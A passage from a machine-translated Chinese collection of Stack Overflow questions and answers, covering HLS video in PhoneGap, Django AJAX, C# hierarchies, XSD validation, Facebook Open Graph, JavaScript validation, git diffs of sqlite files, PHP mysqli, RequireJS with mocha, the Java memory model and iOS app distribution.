我的问题是我似乎无法使用 html5 视频标签和 phonegap/cordova 播放 m3u8 文件。我什至使用 mediafilesegmenter 作为测试创建了未加密的视频片段。这些可以通过在 OSX 中使用 VLC 打开 m3u8 文件来播放，但是当在 phonegap/cordova 中使用视频标签时，我收到“正在加载...”消息，然后弹出“操作无法完成”

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-11-08T17:17:19.977

好的，事实证明 m3u8 文件必须通过 HTTP 提供，我已经沿着将 cocoahttpserver [https://github.com/robbiehanson/CocoaHTTPServer](https://github.com/robbiehanson/CocoaHTTPServer)与应用程序捆绑在一起的路线。这样我可以通过以下方式请求视频流：

```
<video src="http://127.0.0.1:12345/path.m3u8" 
```

# javascript - 使用 jquery get 函数获取查询集的元素。姜戈

> ID：13271629
> 
> 赞同：0
> 
> 时间：2012-11-07T14:21:20.537
> 
> 标签：javascript, jquery, django

在我的 django 应用程序中，我想在用户单击按钮时显示文本，而不刷新页面。当用户再次单击时，我希望显示其他文本，但仍不刷新页面。我不想显示的信息（文本）在一个名为“信息”的查询集中。

所以我想知道如何做到这一点。

这是我尝试这样做的方式：

我创建了一个视图来存储我的查询集：

```
 def get_information (request):
         information= Information.objects.filter(object1__id= X) 
```

然后我创建了一个 jquery get 函数（在用户单击的页面模板中），以便获取此列表中的信息：

```
 function get_info(){
    $.get('/mysite/get_information', {'information':information}, function(data) {
      $('.information').html(data); 
      });
      }; 
```

然后我使用提交按钮和 onclick="get_info" 在我的模板中呈现它。

但我不知道如何让请求在每次请求时获得不同的信息，以免用户两次获得相同的信息。

非常感谢您的帮助。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-07T16:05:29.653

看看[Django Pagination](https://docs.djangoproject.com/en/dev/topics/pagination/?from=olddocs)。您可以在视图中创建 Paginator 对象，然后您可以根据来自客户端的请求显示来自查询集的消息。如果有任何问题，请告诉我。

# c# - 没有 parentID childID 的平面数据的层次结构

> ID：13271634
> 
> 赞同：0
> 
> 时间：2012-11-07T14:21:46.430
> 
> 标签：c#, hierarchy

```
| Level1      | Level2               | Level3       | Level4|

| ELECTRONICS | TELEVISIONS          | NULL         | NULL  |

| ELECTRONICS | TELEVISIONS          | LCD          | NULL  |

| ELECTRONICS | PC                   | NULL         | NULL  |

| ELECTRONICS | PORTABLE ELECTRONICS | MP3 PLAYERS  | FLASH |

| ELECTRONICS | PORTABLE ELECTRONICS | CD PLAYERS   | NULL  |

| ELECTRONICS | PORTABLE ELECTRONICS | 2 WAY RADIOS | NULL  | 
```

在一个遗留数据库中，我有这个表，我试图在一个很好的层次结构 html ul li 列表中打印出来。我一直在 stackoverflow 上尝试不同的答案以在 C# 中构建对象，但它们都有 parentID 和 childID，并且在这种情况下对我有用。

我正在尝试这段代码，但我知道它真的很糟糕，

```
 List<Node> FlatToHierarchy(IList<SearchWord> list)
    {
        List<Node> nodes = new List<Node>();

        foreach (SearchWord x in list)
        {
            if (x.Level2 != " " && x.Level3 == " ")
            {
                Node node = new Node();
                node.Parent = x.Level1;
                node.Child = x.Level2;
                node.Keyword = x.Keyword;
                nodes.Add(node);
                //dict.Add(node.Parent, node);
            }

            if (x.Level3 != " " && x.Level4 == " ")
            {
                Node node = new Node();
                node.Parent = x.Level2;
                node.Child = x.Level3;
                node.Keyword = x.Keyword;
                nodes.Add(node);
                //dict.Add(node.Parent, node);
            }

            if (x.Level4 != " ")
            {
                Node node = new Node();
                node.Parent = x.Level3;
                node.Child = x.Level4;
                node.Keyword = x.Keyword;
                nodes.Add(node);
                //dict.Add(node.Parent, node);
            }
        }

        return nodes;
    } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-07T15:14:46.123

为了建立真正的层次结构，您`class Node`需要在类中有子项。添加`List<Node>`到`Node`以及`Add`方法，因此数据包含层次结构。然后你可以建立一个 html li/ul 列表。例如，`Node`该类可能如下所示：

```
public class Node
{
    public string Name { get; set; } // Current node name
    public string Parent { get; set; }
    public string Keyword { get; set; }
    public int Level { get; set; } // Optional

    private List<Node> _children = new List<Node>();
    public List<Node> Children { get { return _children; } }

    public Node AddChild(Node child)
    {
        _children.Add(child);
        return this;
    }   
} 
```

或者你`Parent`可以引用一个节点：

```
public class Node
{
    public Node Parent { get; set; }
    public string ParentName { get { Parent != null ? Parent.Name : null; } }
    // ...
} 
```

然后要构建 html li/ul 列表，您递归地遍历 Node 结构。

编辑：实际上，现在我想到了，您可能只想从数据构建一个分层的 XML 文档。然后您可以从 xml 构建 ul/li：

```
public class Data
{
    public string Level1 { get; set; }
    public string Level2 { get; set; }
    public string Level3 { get; set; }
    public string Level4 { get; set; }
}

public Data[] sampleData = new Data[] {
    new Data { Level1 = "ELECTRONICS", Level2 = "TELEVISIONS", Level3 = null, Level4 = null },
    new Data { Level1 = "ELECTRONICS", Level2 = "TELEVISIONS", Level3 = "LCD", Level4 = null },
    new Data { Level1 = "ELECTRONICS", Level2 = "PC", Level3 = null, Level4 = null },
    new Data { Level1 = "ELECTRONICS", Level2 = "PORTABLE ELECTRONICS", Level3 = "MP3 PLAYERS", Level4 = "FLASH" },
    new Data { Level1 = "ELECTRONICS", Level2 = "PORTABLE ELECTRONICS", Level3 = "CD PLAYERS", Level4 = null },
    new Data { Level1 = "ELECTRONICS", Level2 = "PORTABLE ELECTRONICS", Level3 = "2 WAY RADIOS", Level4 = null },
};

XElement AddNode(string name)
{
    return new XElement("Node", 
        new XAttribute("Name", name));
}

// NOTE: This is not optimized, but you get the idea...
XDocument BuildHierarchy(IEnumerable<Data> data)
{
    XElement root = new XElement("Root");
    XDocument xdoc = new XDocument(root);
    XElement level1 = null;
    XElement level2 = null;
    XElement level3 = null;
    XElement level4 = null;

    foreach (var item in data)
    {
        // Assumes item.Level1 is never empty...
        if (level1 == null || string.Compare(item.Level1, level1.Attribute("Name").Value) != 0)
        {
            level1 = AddNode(item.Level1);
            root.Add(level1);
            level2 = null;
            level3 = null;
            level4 = null;
        }

        if (string.IsNullOrWhiteSpace(item.Level2))
        {
            level2 = null;
            level3 = null;
            level4 = null;
            continue;
        }

        if (level2 == null || string.Compare(item.Level2, level2.Attribute("Name").Value) != 0)
        {
            level2 = AddNode(item.Level2);
            level1.Add(level2);
            level3 = null;
            level4 = null;
        }

        if (string.IsNullOrWhiteSpace(item.Level3))
        {
            level2 = null;
            level3 = null;
            level4 = null;
            continue;
        }

        if (level3 == null || string.Compare(item.Level3, level3.Attribute("Name").Value) != 0)
        {
            level3 = AddNode(item.Level3);
            level2.Add(level3);
            level4 = null;
        }

        if (string.IsNullOrWhiteSpace(item.Level4))
        {
            level4 = null;
            continue;
        }

        if (level4 == null || string.Compare(item.Level4, level4.Attribute("Name").Value) != 0)
        {
            level4 = AddNode(item.Level4);
            level3.Add(level4);
        }
    }

    return xdoc;
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-07T14:37:13.280

我会将此表放入一组行并将每列上的行分组，但这取决于您最终想要的数据结构。

如果您只需要 HTML 中的分层列表并且它只有 4 列，请相应地执行按`Level1`、`Level2`、排序的数据库查询`Level3`，`Level4`然后遍历它们。保留一个指示器以查看级别是否更改并根据需要输出 HTML 代码。

# xml - XML 验证不会根据另一个属性验证一个属性

> ID：13271636
> 
> 赞同：1
> 
> 时间：2012-11-07T14:21:51.593
> 
> 标签：xml, xsd

我浏览了许多站点，然后创建了 Xml Schema，其中其他属性取决于其中一个属性的值。

下面的xml文件：

```
<?xml version="1.0"?>
<Main>
  <Matter kind="fruits" calories="10" name="apple" quantity="10" color="red"/>
  <Matter kind="car" brand="ford" name="ikon" quantity="1" color="red"/>
  <Matter kind="country" continent="Asia" name="japan"/>
</Main> 
```

kind 属性可以有水果、汽车和国家。并且根据属性需要其他参数，例如国家值，需要大洲属性。

下面是XSD文件，

```
<?xml version="1.0" encoding="UTF-8"?>
<xs:schema xmlns:xs="http://www.w3.org/2001/XMLSchema" elementFormDefault="qualified">
  <xs:element name="Main">
    <xs:complexType>
      <xs:sequence>
        <xs:element maxOccurs="unbounded" ref="Matter"/>
      </xs:sequence>
    </xs:complexType>
  </xs:element>
  <xs:element name="Matter">
    <xs:complexType>
      <xs:attribute name="name" use="required" type="xs:NCName"/>
      <xs:alt cond="@kind='fruits'"> 
      <xs:attribute name="kind" use="required" type="xs:NCName" fixed="fruits"/>
      <xs:attribute name="color" type="xs:NCName"/>
      <xs:attribute name="quantity" type="xs:integer"/>
      </xs:alt>
      <xs:alt cond="@kind='car'"> 
      <xs:attribute name="kind" use="required" type="xs:NCName" fixed="car"/>
      <xs:attribute name="brand" type="xs:NCName"/>
      <xs:attribute name="quantity" type="xs:integer"/>
      <xs:attribute name="color" type="xs:NCName"/>
      </xs:alt>
      <xs:alt cond="@kind='country'"> 
      <xs:attribute name="kind" use="required" type="xs:NCName" fixed="country"/>
      <xs:attribute name="continent" type="xs:NCName" use="required"/>
      </xs:alt>
    </xs:complexType>
  </xs:element>
</xs:schema> 
```

当我使用上述 XSD 验证 XML 文件时，我收到错误消息“元素 alt 无效、放错位置或经常发生。

请帮助我使用适当的 XSD 验证上述文件。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-07T18:29:07.457

我不知道你从哪里得到 xsl:alt 的想法。也许是 XML Schema 的一些专有扩展？

XSD 1.1 标准有一个称为条件类型分配的工具，有点像这样，带有一个称为 xs:alternative 的元素。Xerces 和 Saxon 的最新版本支持 XSD 1.1。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-17T07:40:24.970

我想你应该使用`xs:extension`如下。这是一个示例 XML：

```
<?xml version="1.0" encoding="UTF-8"?>
<Main xmlns="http://www.example.com/matters">
    <Fruit calories="10" name="apple" quantity="10" color="red"/>
    <Car brand="ford" name="ikon" quantity="1" color="red"/>
    <Car brand="dodge" name="fire" quantity="1" color="blue"/>
    <Country continent="Asia" name="Japan"/>
    <Country continent="Europe" name="Italy"/>
</Main> 
```

这是此 XML 的 XSD。唯一的限制是相同类型的元素应该按顺序分组。您也可以添加固定属性，但由于标签的名称表示类型，我发现它们没有必要。

```
<?xml version="1.0" encoding="UTF-8"?>
<xs:schema targetNamespace="http://www.example.com/matters" xmlns="http://www.example.com/matters" xmlns:xs="http://www.w3.org/2001/XMLSchema" elementFormDefault="qualified">
    <!-- document structure -->
    <xs:element name="Main">
        <xs:complexType>
            <xs:sequence>
                <xs:element name="Fruit" type="fruitType" minOccurs="0" maxOccurs="unbounded" />
                <xs:element name="Car" type="carType" minOccurs="0" maxOccurs="unbounded" />
                <xs:element name="Country" type="countryType" minOccurs="0" maxOccurs="unbounded" />
            </xs:sequence>
        </xs:complexType>
    </xs:element>
    <!-- types definitions -->
    <xs:complexType name="matterType">
        <xs:attribute name="name" use="required" type="xs:NCName"/>
    </xs:complexType>
    <xs:complexType name="fruitType">
        <xs:complexContent>
            <xs:extension base="matterType">
                <xs:attribute name="color" type="xs:NCName"/>
                <xs:attribute name="quantity" type="xs:integer"/>
                <xs:attribute name="calories" type="xs:integer"/>
            </xs:extension>
        </xs:complexContent>
    </xs:complexType>
    <xs:complexType name="carType">
        <xs:complexContent>
            <xs:extension base="matterType">
                <xs:attribute name="brand" type="xs:NCName"/>
                <xs:attribute name="quantity" type="xs:integer"/>
                <xs:attribute name="color" type="xs:NCName"/>
            </xs:extension>
        </xs:complexContent>
    </xs:complexType>
    <xs:complexType name="countryType">
        <xs:complexContent>
            <xs:extension base="matterType">
                <xs:attribute name="continent" type="xs:NCName" use="required"/>
            </xs:extension>
        </xs:complexContent>
    </xs:complexType>
</xs:schema> 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-12-06T11:28:25.460

看起来您正在尝试从另一种类型中创建一种类型。我认为您应该使用自己的规则重构和创建新类型。然后，您可以继续使用原始修改的 xsd 并一次性解析。

```
<?xml version="1.0"?>
<Main>
    <fruits calories="10" name="apple" quantity="10" color="red"/>
    <car brand="ford" name="ikon" quantity="1" color="red"/>
    <country continent="Asia" name="japan"/>
</Main> 
```

# php - 在 PHP 中使用 Open Graph 时发布“FB.api”错误

> ID：13271638
> 
> 赞同：0
> 
> 时间：2012-11-07T14:21:53.137
> 
> 标签：php, facebook-graph-api

我正在使用[Open Graph](http://en.wikipedia.org/wiki/Facebook_Platform#Open_Graph_protocol)，其中操作类型为“Repin”，对象类型为“视频”。当我尝试发布时，我遇到了一些错误。我怎样才能消除这个错误？

请看下面的代码。但是，我一次又一次地查看 Open Graph 动作和对象。在错误控制台中，我得到了响应`HTTP//1.1 200 OK 1857`。

```
<?php
    require 'data/facebook/src/facebook.php';

    $facebook = new Facebook(array(
        'appId'  => 'xxxxxxxxxxxxxxx',
        'secret' => 'xxxxxxxxxxxxxxxxxxx',
    ));

    // See if there is a user from a cookie
    $user = $facebook->getUser();

    if ($user) {
        try {
            // Proceed knowing you have a logged in user who's authenticated.
            $user_profile = $facebook->api('/me');
        }
        catch (FacebookApiException $e) {
            echo '<pre>'.htmlspecialchars(print_r($e, true)).'</pre>';
            $user = null;
        }
    }
?>

<html xmlns="http://www.w3.org/1999/xhtml" dir="ltr" lang="en-US"
      xmlns:fb="https://www.facebook.com/2008/fbml">
    <title>OG Tutorial App</title>
    <head prefix="og: http://ogp.me/ns# fb: http://ogp.me/ns/fb# xxxxxxxxxx:                        http://ogp.me/ns/fb/xxxxxxxxxxx#">
        <meta property="fb:app_id" content="xxxxxxxxxxxxx" />
        <meta property="og:type"   content="<namespace>:<action>" />
        <meta property="og:url"    content="<#### My URL ######>" />
        <meta property="og:title"  content="Sample Video" />
        <meta property="og:image"  content="http://xxxxxxxxxxxxxxxxxxxximage.jpeg" />
        <script type="text/javascript">
            ########### MAIN FOCUS ON THESE BELOW LINES ###############################
            function postCook()
            {
                FB.api(
                    '/me/<namespace>:<action>',
                    'post',
                    {<graph object>: 'http://xxxxxxURLxxxxxxxxxxx' },
                    function(response) {
                        //alert(response.responseText);
                        console.log(response);

                        if (!response || response.error) {
                            alert('An error occurred.');
                        }
                        else {
                            alert('Cook was successful! Action ID: ' + response.id);
                        }
                });
            }
            ###################################################################################
        </script>
    </head>
    <body>
        <div id="fb-root"></div>
        <div id="fb-root"></div>
        <script>
                FB.Event.subscribe('auth.login', function(response) {
                    window.location.reload();
                });
                FB.Event.subscribe('auth.logout', function(response) {
                    window.location.reload();
                });
            };
            (function() {
                var e = document.createElement('script'); e.async = true;
                e.src = document.location.protocol +
                        '//connect.facebook.net/en_US/all.js';
                document.getElementById('fb-root').appendChild(e);
            }());
        </script>
        <h3>Stuffed Cookies</h3>
        <p>
            <img title="Stuffed Cookies"
                 src="http://xxxxxxxxxxxxxxxxxxxxxx.jpeg"
                 width="200"/>
        </p>
        <br>
        <form>
            <input type="button" value="Cook" onclick="postCook()" />
        </form>
    </body>
</html> 
```

# javascript - 在 JavaScript 中验证文本框

> ID：13271639
> 
> 赞同：1
> 
> 时间：2012-11-07T14:21:53.897
> 
> 标签：javascript

我需要一个接受的验证文本框，像这样 $250.00 这里是 '$' 只会接受一次，然后永远不会接受 '$' 以及 '.'（点）。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-07T14:28:37.660

您可以使用[掩码输入](http://digitalbush.com/projects/masked-input-plugin/)，例如您的掩码是

```
$('#input').mask('$9?.99'); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-07T14:29:09.797

你可以做：

```
var x = document.getElementById('your-text-box').value;

if(x.match(/^\$[0-9]+\.[0-9]+$/) == null) {
   // invalid
}
else {
   // valid
} 
```

正则表达式`/^\$[0-9]+\.[0-9]+$/`将*匹配*任何满足以下约束的字符串

*   应该从一个`$`
*   应该有`1 or more numbers`后`$`
*   `.`在第一组数字之后应该有一个
*   应该在`1 or more numbers`之后结束`.`

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-07T14:36:51.813

jquery是一个选项吗？

这是一个jQuery解决方案。首先，我不会验证期望用户输入'$'。我会把它放在表格之外，只允许人们输入金额。这很奇怪，但我想我真的不知道你在做什么。请参阅[Jquery 验证](http://docs.jquery.com/Plugins/Validation)：

```
$("#myform").validate({
  rules: {
    field: {
      required: true,
      digits: true
    }
 }
}); 
```

这是使用[数字](http://docs.jquery.com/Plugins/Validation/Methods/digits)只允许数字。否则，如果你真的需要 $ ，你需要创建一个[自定义验证规则](http://docs.jquery.com/Plugins/Validation/Validator/addMethod#namemethodmessage)。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-11-07T14:51:45.967

```
<!-- wherever your jquery file is -->     
<script src="../../jquery.min.js"></script>
<input type="text" id="cost"><input type="button" id="check" value="Check!"> 
<script>

// jquery solution

 $(document).ready( function (){
    $('#check').click( function (){
            var cost = $('#cost').val();
            var patt=/^(\$)?\d+(\.\d+)?$/;
            var result=patt.test(cost);
            alert(result);
            });

 });

 </script> 
```

当然你也可以使用纯java脚本来减少依赖

```
<input type="text" id="cost">
<input type="button" id="check" value="Check!" onClick="check();"> 
<script>

//  Pure Javascript Solution 

var check = function (){
    var cost = document.getElementById('cost').value;
    var patt=/^(\$)?\d+(\.\d+)?$/;
    var result=patt.test(cost);
    alert(result);

}
</script> 
```

# git - diff sqlite 表的 Git 钩子

> ID：13271643
> 
> 赞同：8
> 
> 时间：2012-11-07T14:22:05.083
> 
> 标签：git, sqlite, githooks

我在 Git 存储库中有一个 Sqlite 数据库。今天我想在两个不同的提交中做一个视图的差异。我是这样做的：

```
$ sqlite3 -list file.sqlite "SELECT * FROM contact_list_detailed" >/tmp/newlist
$ git checkout 51c24d13c file.sqlite
$ sqlite3 -list file.sqlite "SELECT * FROM contact_list_detailed" >/tmp/oldlist
$ git checkout -- file.sqlite
$ diff /tmp/oldlist /tmp/newlist 
```

它有效，如果我愿意，我可以编写脚本。但是有没有任何“好”的方法可以用钩子做到这一点？

* * *

## 回答 #1

> 赞同：26
> 
> 时间：2014-02-14T20:42:56.980

[以下](https://web.archive.org/web/20150602052210/http://ongardie.net/blog/sqlite-in-git)是如何使用 git 的`textconv`功能来显示 sqlite 文件版本之间的差异。它只是进行转储，因此对于大型数据库来说可能不是超级高效。不需要钩子。

该链接似乎不再可用，因此我使用的是存档版本。

它的要点是，在 git 属性文件（`.gitattributes`或`.git/info/attributes`）中，添加模式匹配以强制 sqlite3 差异（假设您的数据库文件具有扩展名`.sqlite3`）：

```
*.sqlite3 diff=sqlite3 
```

然后在您的 git 配置文件（`~/.gitconfig`或`.git/config`）中：

```
[diff "sqlite3"]
    binary = true
    textconv = "echo .dump | sqlite3" 
```

如果您只想跟踪架构更改，请使用`.schema`而不是`.dump`.

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-11-07T16:18:28.223

您将使用`HEAD`和`HEAD^`访问以前和当前的修订；有关示例，请参见[git post-commit hook - 已提交文件](https://stackoverflow.com/questions/3616648/git-post-commit-hook-script-on-committed-files)上的脚本。

用于[`git show`](http://www.kernel.org/pub/software/scm/git/docs/git-show.html)将文件提取到临时目录而不覆盖工作副本。

* * *

`git`除非绝对必要，否则我不会存储二进制文件。如果您使用创建 SQL 命令的文本文件并将其放入 git 中，将二进制数据库仅作为生成的文件，则可以避免`sqlite3 file.sqlite .dump`很多*麻烦*。（但是你必须关心在必要时重新生成 SQL 文件。）

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2020-02-02T14:57:31.457

万一真的想在 git 中跟踪二进制数据库文件，就会出现一些问题。由于 sqlite 数据库可能会有所不同，而其中存储的数据没有更改，因此`git status`对于确定是否应该提交并`git diff`只显示类似`Binary files a/foo.sql and b/foo.sql differ`. 要从中获得正确的输出，`git diff`基本上有两种方法来比较各个文件：

1.  用于将文件转换为纯文本，如[Biran Minton](https://stackoverflow.com/a/21789167/1905491)`textconv`的答案所示。
2.  设置一个能够直接创建差异的自定义差异应用程序。

我将概述下面使用`sqldiff`sqlite 附带的第二种方法。与`textconv`方法一样，需要更改属性和配置文件。

*属性：*

```
*.sql* diff=sqldiff 
```

*配置：*

```
[diff "sqldiff"]
    command = gitsqldiff 
```

上面的`gitsqldiff`字符串是指一个包装脚本，它需要安排 git 给定的参数以供`sqldiff`. 它必须是可执行的并且可以通过`PATH`环境变量访问（放入它`~/bin`应该没问题）。因为（截至目前）的退出值`sqldiff`始终为 0，因此相当无用，我们必须检查它打印的内容以向用户提供反馈 - 特别是在数据库中没有任何更改的情况下，根据`sqldiff`它根本不会产生任何输出。为此并向用户显示完整的输出，我们使用了一种[技巧](https://unix.stackexchange.com/a/43536/41065)，将输出重定向到附加的文件描述符并`stdout`通过`tee`.

`gitsqldiff`：

```
#!/bin/sh
echo "$1:"

# Duplicate sqldiff's output for consumption by wc and stdout.
# This enables us to check for an empty output but still see
# sqldiffs messages if there are any.
sqldiff "$2" "$5" 2>&1 | {
    tee /dev/fd/3 |
        if [ $(wc -c) -eq 0 ]; then
            echo "  nothing changed according to sqldiff"
        fi
} 3>&1 
```

这当然不会使 sql 文件成为 git 存储库中的一等公民，但可能会促进仍然有效的工作流程。

# php - 将 mysqli 对象传递给类

> ID：13271644
> 
> 赞同：1
> 
> 时间：2012-11-07T14:22:06.107
> 
> 标签：php

我想将一个 mysqli 对象传递给一个类。我在一个文件中创建对象：

```
$host = 'host';
$user = 'username';
$pw = 'pw';
$db = 'db';

$link = new mysqli($host,$user,$pw,$db); 
```

包含在一页中：

```
include 'php/mysql.php';
include 'php/classes/Class.Dataconnector.php';
$dc = new Dataconnector($link); 
```

这个类看起来像这样：

```
class Dataconnector {
    protected $_link;
    protected $_stub;

    function __construct(mysqli $link) {
        $_link = $link;
    }

    public function getPageContent($stub) {
        $query = "select * from contents where pageId = (select id from pages where stub = '$stub')";
        $result = mysqli_query($_link,$query);
        return $result;
    }
} 
```

但我得到这个错误：

```
Warning: mysqli_query() expects parameter 1 to be mysqli, null given in \php\classes\Class.Dataconnector.php on line 18 
```

怎么了 ？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-07T14:29:20.483

`$this`访问类中的类属性时需要使用`$_link`。

在您的构造函数中，您有：

```
$_link = $link; 
```

这应该是：

```
$this->_link = $link; 
```

在您的`getPageContent()`方法中，您有：

```
$result = mysqli_query($_link,$query); 
```

这应该是：

```
$result = mysqli_query($this->_link,$query); 
```

# coffeescript - Requirejs 和 mocha

> ID：13271646
> 
> 赞同：3
> 
> 时间：2012-11-07T14:22:15.413
> 
> 标签：coffeescript, requirejs, mocha.js

RequireJS 和 mocha 在协同工作时遇到了一些问题。我认为这是因为 mocha 不等待 requireJS 的异步操作完成并决定测试完成。

作为一个热修复，我将 requireJS 的加载调用包装在 mocha 的`it()`调用中。不知何故，mocha 知道当我添加回调时，它应该等待异步方法完成。

但我想知道是否没有比我现在使用的更方便的设置。当前的设置不是很好，也不是很灵活。

这是我的 test.coffee 脚本：

```
describe 'Ink', ->
    describe '#constructor', ->
        it 'should return an Ink instance', ( done ) ->
            requirejs [ "build/ink/core/Ink" ], ->
                # commence testing
                a = new Ink( '<div></div>' )
                assert.equal( new Ink instanceof Ink, false )
                assert.equal( new Ink instanceof window.jQuery, true )

                done()

describe 'Mixin', ->

    f : ( Mixin ) ->
        # test mixin
        class A

            constructor : ( @a ) ->

        class m extends Mixin

            constructor : () -> @mixin_prop = 42
            increment : ( arg ) -> return arg + 1

        class B extends A
            Mixin.mixin( m, @ )

        b = new B()

        return b

    it 'should chain the constructor', ( done ) ->
        requirejs [ "build/ink/core/Mixin" ], ( Mixin ) ->
            b = f( Mixin )
            assert.equal( b.mixin_prop, 42 )
            done()

    it 'should add the methods from the mixin to the new class', ( done ) ->
        requirejs [ "build/ink/core/Mixin" ], ( Mixin ) ->
            b = f( Mixin )
            assert.equal( b.increment( 42 ), 42 )
            done() 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-17T18:19:14.230

我在 beforeEach 中初始化我的模块，并使用回调来触发异步：

```
describe...
    var Module
    beforeEach(function(callback){
        requirejs
            Module = loadedFile
            callback(); // suites will now run
    }) 
```

我在这里有一个引导程序：[https ://github.com/clubajax/mocha-bootstrap](https://github.com/clubajax/mocha-bootstrap)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-06-20T21:40:55.107

Mocha 为`done`您调用的函数提供了一个回调`it`，它可以很好地用于此目的。这是我当前如何使用它的一个示例——请注意，我也在使用 require 来加载我的测试配置，显然这是直接的 JS，而不是 CoffeeScript，但它应该获得。

```
define([
  'chai',
  'SystemUnderTest'
], function(chai, SystemUnderTest) {

var expect = chai.expect;

describe('A functioning system', function() {

  it('knows when to foo', function(done) {
    sut = new SystemUnderTest();
    expect(sut.foo()).to.be.ok;
    done();
  });
}); 
```

所以 mocha 对异步测试的支持，你可能“通常”用来测试异步服务，也可以用来支持异步加载模块的测试。

[Mocha 的异步文档](http://visionmedia.github.io/mocha/#asynchronous-code)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-08T20:50:03.150

我没有在测试中使用过 requirejs，但我认为该`before`功能可能会有所帮助：

```
describe 'Mixin - ', ->
  before (done) ->
    console.log dateFormat(new Date(), "HH:MM:ss");
     requirejs [ "build/ink/core/Ink" ], ->
                # commence testing
                a = new Ink( '<div></div>' )
                assert.equal( new Ink instanceof Ink, false )
                assert.equal( new Ink instanceof window.jQuery, true )
    done()
  beforeEach ->
    ....
  describe ... 
```

# java - 为什么 Java 内存模型允许这种行为？

> ID：13271649
> 
> 赞同：16
> 
> 时间：2012-11-07T14:22:31.653
> 
> 标签：java, concurrency, compiler-optimization, java-memory-model, causality

JMM 中的因果关系似乎是其中最令人困惑的部分。我有几个关于 JMM 因果关系的问题，以及并发程序中允许的行为。

据我了解，当前的 JMM 始终禁止因果循环。（我对吗？）

现在，根据[JSR-133](http://www.cs.umd.edu/~pugh/java/memoryModel/jsr133.pdf)文档，第 24 页，图 16，我们有一个示例，其中：

最初`x = y = 0`

**线程 1：**

```
r3 = x;
if (r3 == 0)
    x = 42;
r1 = x;
y = r1; 
```

**线程 2：**

```
r2 = y;
x = r2; 
```

直觉上，`r1 = r2 = r3 = 42`似乎是不可能的。但是，它不仅被提及为可能，而且在 JMM 中也是“允许的”。

对于这种可能性，我无法理解的文件中的解释是：

> 编译器可以确定唯一分配给的值`x`是 0 和 42。据此，编译器可以推断出，在我们执行 的点，我们`r1 = x`刚刚执行了 42 的写入 `x`，或者我们刚刚阅读`x`并看到值 42。在任何一种情况下，读取值 42 都是合法的`x`。然后它可以更改`r1 = x`为`r1 = 42`; 这将允许更早`y = r1`地转换`y = 42`和执行，从而导致有问题的行为。在这种情况下，首先提交写入`y`。

我的问题是，究竟是什么样的编译器优化？（我对编译器一无所知。）由于 42 只是有条件地编写，当`if`满足该语句时，编译器如何决定编写`x`？

其次，即使编译器进行了这种推测性的优化，并且提交`y = 42`然后最终使`r3 = 42`，这是否违反了因果循环，因为现在已经没有因果关系了？

事实上，在同一文档（第 15 页，图 7）中有一个示例，其中提到了类似的因果循环是不可接受的。

那么这个执行顺序为什么在 JMM 中是合法的呢？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-11-07T15:02:28.063

如前所述，唯一写入的值`x`是 0 和 42。线程 1：

```
r3 = x; // here we read either 0 or 42
if (r3 == 0)
  x = 42;  
// at this point x is definitely 42
r1 = x; 
```

因此，JIT 编译器可以重写`r1 = x`为`r1 = 42`，甚至更进一步`y = 42`。关键是，线程 1 将**始终无条件地**将 42 写入`y`. 该`r3`变量实际上是多余的，可以从机器代码中完全消除。所以示例中的代码只给出了从`x`to的因果箭头的外观`y`，但详细分析表明实际上没有因果关系。`y`令人惊讶的结果是可以提前提交写入。

关于优化的一般说明：我认为您熟悉从主内存读取所涉及的性能损失。这就是为什么 JIT 编译器一心想要尽可能拒绝这样做的原因，在这个例子中，事实证明它实际上不需要读取`x`就知道要写入什么`y`。

关于符号的一般说明：`r1`, `r2`,`r3`是**局部变量**（它们可以在堆栈上或 CPU 寄存器中）；`x`,`y`是**共享变量**（它们在主存储器中）。如果不考虑这一点，这些示例将毫无意义。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-11-07T15:06:25.343

编译器可以执行一些分析和优化，并以 Thread1 的以下代码结束：

```
y=42; // step 1
r3=x; // step 2
x=42; // step 3 
```

对于单线程执行，这段代码等同于原始代码，因此是合法的。然后，如果 Thread2 的代码在 step 1 和 step2 之间执行（这很有可能），那么 r3 也被分配 42。

此代码示例的整个想法是演示正确同步的需要。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-07T15:03:35.973

没有在`javac`很大程度上优化代码是毫无价值的。JIT 优化了代码，但对重新排序代码相当保守。CPU 可以重新排序执行，并且在很小的程度上执行此操作。

强制 CPU 不进行指令级优化是相当昂贵的，例如它可以减慢 10 倍或更多。AFAIK，Java 设计者想要指定在大多数 CPU 上有效工作所需的最低保证。

# iphone - 在没有 App Store 的情况下将 App 分发给大量外部成员

> ID：13271652
> 
> 赞同：1
> 
> 时间：2012-11-07T14:22:48.373
> 
> 标签：iphone, ios, ipad, distribution

我有一个专业协会客户，其会员人数远远超过 5000 人。他们希望我们调整我们已经商业开发的应用程序，以便分发给他们的会员。虽然他们希望免费分发给这组用户，但他们希望将分发限制在他们的成员范围内。有没有人为这种类型的发行版开发过：

1）应用程序本身不会分布在内部 2）用户数量将远远超过 100 3）IT 部门无法控制客户端设备 4）客户端在地理上分散且不倾斜（可以理解）发送设备进行安装 - 这意味着需要通过电线或空中安装。

我正在寻找符合这些标准的明确答案，并且我将发布我的发现和经验供其他人遵循，因为这似乎是一个常见问题。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-07T14:25:37.210

好吧，Apple 不允许这种分发方式。

企业许可证将授予您自行分发应用程序的权利，但仅限于注册公司的员工作为内部应用程序。

